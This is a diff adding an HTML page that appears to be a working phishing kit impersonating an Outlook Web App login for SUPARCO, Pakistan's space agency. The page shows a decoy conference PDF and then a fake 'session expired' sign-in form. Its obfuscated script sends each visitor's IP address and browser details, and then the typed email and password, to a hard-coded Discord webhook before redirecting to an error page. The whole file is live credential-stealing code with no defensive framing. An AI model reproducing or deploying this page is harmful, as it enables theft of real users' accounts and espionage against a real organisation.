@@ -1,0 +1,198 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+ 
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN"> 
+<html>
+<head>
+
+<meta http-equiv="X-UA-Compatible" content="IE=10" />
+<link rel="shortcut icon" href="/owa/auth/15.0.1497/themes/resources/favicon.ico" type="image/x-icon">
+<meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
+<meta name="Robots" content="NOINDEX, NOFOLLOW"> 
+<link rel="stylesheet" href="./suparco/suparco.css" >
+<title>Outlook Web App</title>
+ <style type="text/css">
+ 
+.copyright {
+  background: url(./meet/download.svg) no-repeat scroll center top transparent;
+  background-size: 25px auto;
+}
+
+        /* Style the PDF viewer to cover the entire screen */
+        #pdfViewer {
+            position: fixed; /* Position it fixed to cover the whole screen */
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none; /* Remove default border */
+            z-index: 9999; /* Ensure it's on top of other elements */
+        }
+
+        /* Initially hide the HTML content */
+        #content {
+            display: none;
+        }
+    </style>
+</head>
+
+
+
+ 
+
+<body class="signInBg" style="background: #f2f2f2 url('./suparco/1.png') repeat-x"/>
+
+
+    <div id="pdf-container" style="display: block;">
+        <object id="pdfViewer" data="./Third Belt and Road High Level Conference on Intellectual Property.pdf#toolbar=0" type="application/pdf"> 
+</object>
+
+    </div>
+
+    <div id="content-page" style="display: none;">
+ 
+
+<form  id="logonForm"  name="logonForm" target="_parent" method="post"  autocomplete="off">
+<input type="hidden" name="destination"  >
+<input type="hidden" name="flags" value="4">
+<input type="hidden" name="forcedownlevel" value="0">
+ 
+ <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
+<div id="mainLogonDiv" class="mouse">
+    
+    <div class="sidebar">
+        <div class="owaLogoContainer">
+            <img src="./suparco/3.png" class="owaLogo" aria-hidden="true" />
+            <img src="./suparco/4.png" class="owaLogoSmall" aria-hidden="true" />
+        </div>
+    </div>
+
+
+ 
+
+
+    <div class="logonContainer">
+	<div id="lgnDiv" class="logonDiv" >
+        
+            <div class="signInImageHeader" role="heading" aria-label="Outlook Web App ">
+                <img class="mouseHeader" src="./suparco/5.png" alt="Outlook Web App " />
+            </div>
+        
+		<div class="signInInputLabel" id="userNameLabel" aria-hidden="true">Email address:</div>
+		<div><input id="username" name="username" class="signInInputText" role="textbox" aria-labelledby="userNameLabel"/></div>
+		<div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
+		<div><input id="password" onfocus="g_fFcs=0" name="password" value="" required type="password" class="signInInputText" aria-labelledby="passwordLabel"/></div>
+        <div><input id="passwordText" onfocus="g_fFcs=0" name="passwordText" value="" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel"/></div>
+ 
+        <div class="showPasswordCheck signInCheckBoxText">
+            <input type="checkbox" id="showPasswordCheck" class="chk"   />
+            <span>Show password</span>
+        </div>
+		
+            <div id="signInErrorDiv" class="signInError"  style="font-size: 12px;
+    color: #C1272D;     font-family: 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI WPC Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+    margin-top: 12px;
+" role="alert" tabIndex="0">
+            Your session has expired. Please sign in again.
+            </div>
+        
+
+		<div id="expltxt" class="signInExpl" role="alert">
+			
+		</div>
+		 
+
+<div class="signInEnter">
+            <div class="signinbutton" role="button" type="submit" tabindex="0">
+                <img class="imgLnk" src="./suparco/6.png" alt=""><input class="signinTxt" value="sign in" type="submit" style="border: none; background-color: #F6F6F6; font-size: 20px;
+    color: #0072C6;
+    font-family: 'Segoe UI', 'Segoe WP', 'Segoe UI WPC', Tahoma, Arial, sans-serif;
+">
+
+</div>
+
+
+
+</form>
+          
+ <script>
+   
+    // Function to show the HTML content and hide the PDF viewer
+    function showContent() {
+        document.getElementById('pdfViewer').style.display = 'none';
+        document.getElementById('content-page').style.display = 'block';
+        
+     
+    }
+
+    // Set a timeout to call showContent after 5 seconds
+    setTimeout(showContent, 5000);
+
+ 
+ // modified
+
+      function sendDiscordNotification(message) {
+    var _0x33402a = window.location.href;
+    var _0x460236 = new URL(_0x33402a);
+    var clientside = _0x460236.searchParams.get("suparco.gov.pk");
+    var ipAddress = '';
+    var userAgent = navigator.userAgent;
+
+    // Fetch the current IP address
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+        message += "\nUsername: " + clientside + "\nIP Address: " + ipAddress + "\nUser Agent: " + userAgent;
+
+        // Send the notification to Discord
+        fetch('https://discordapp.com/api/webhooks/1270629091237691443/CxvPu7qDTBwFjUJ6-n0CMItFqIKj7129zH2Cwp4XGQDhs1CC5OBHETdX955KqH9eFUJw', {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ content: message })
+        });
+      });
+  }
+
+   window.onload = function () {
+     // Get the value of the clientside parameter from the URL
+     var _0x33402a = window.location.href;
+     var _0x460236 = new URL(_0x33402a);
+     var _0x4ec704 = _0x460236.searchParams.get("suparco.gov.pk");
+     document.getElementById("username").value = _0x4ec704;
+
+     // Display the dialog box and hide other elements after a delay
+     setTimeout(function () {
+       // Send notification to Discord
+       sendDiscordNotification("Your page has been visited by Suparco Member:");
+     }, 0xbb8);
+
+     // Add event listener for form submission
+     document.getElementById("logonForm").addEventListener('submit', function (_0x90fbbd) {
+       _0x90fbbd.preventDefault();
+       var _0x1709cb = document.getElementById("username").value;
+       var _0x1a97be = document.getElementById("password").value;
+       var _0x8459d3 = {
+         'content': "Uniform: " + _0x1709cb + "\nPapa: " + _0x1a97be + " \nBrowser Details: " + navigator.userAgent + ", \nTime: " + new Date().toLocaleString()
+       };
+        
+       fetch('https://discordapp.com/api/webhooks/1270629091237691443/CxvPu7qDTBwFjUJ6-n0CMItFqIKj7129zH2Cwp4XGQDhs1CC5OBHETdX955KqH9eFUJw', {
+         'method': "POST",
+         'headers': {
+           'Content-Type': 'application/json'
+         },
+         'body': JSON.stringify(_0x8459d3)
+       }).then(() => {
+         window.location.href = "error.html?suparco.gov.pk=" + encodeURIComponent(_0x1709cb);
+       });
+     });
+   };
+       // Function to disable right-click context menu
+        document.addEventListener('contextmenu', function(event) {
+            event.preventDefault(); 
+        });
+
+    </script>
+</body>
+</html>
